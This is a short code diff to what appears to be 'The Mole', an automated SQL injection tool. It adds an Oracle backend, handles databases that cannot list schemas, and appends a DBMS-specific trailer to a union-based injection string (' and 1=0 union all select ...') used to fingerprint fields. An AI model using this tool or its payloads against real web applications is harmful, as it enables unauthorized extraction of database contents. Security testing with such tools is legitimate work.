@@ -27,6 +27,7 @@ from dbmsmoles import DbmsMole
 from mysql import MysqlMole
 from postgres import PostgresMole
 from mssql import MssqlMole
+from oracle import OracleMole
 from dbdump import DatabaseDump
 from threader import Threader
 from output import BlindSQLIOutput
@@ -38,7 +39,7 @@ class TheMole:
     field = '[_SQL_Field_]'
     table = '[_SQL_Table_]'
     
-    dbms_mole_list = [MysqlMole, PostgresMole, MssqlMole]
+    dbms_mole_list = [MysqlMole, PostgresMole, MssqlMole, OracleMole]
     
     def __init__(self, threads = 4):
         self.initialized = False
@@ -188,6 +189,9 @@ class TheMole:
             return dump_result
 
     def get_databases(self, force_fetch=False):
+        if not self._dbms_mole.lists_schemas():
+            self.database_dump.add_db(self._dbms_mole.default_schema())
+            raise Exception(self._dbms_mole.dbms_name() + ' does not support schema listing.')
         if not force_fetch and self.database_dump.db_map:
             return list(self.database_dump.db_map.keys())
         if self.mode == 'union':
@@ -499,7 +503,7 @@ class TheMole:
             hash_string = ",".join(hashes)
             req = self.analyser.decode(self.get_requester().request(
                     self.generate_url(
-                        " and 1=0 union all select " + hash_string
+                        " and 1=0 union all select " + hash_string + dbms_mole.field_finger_trailer()
                     )
                   ))
             try:
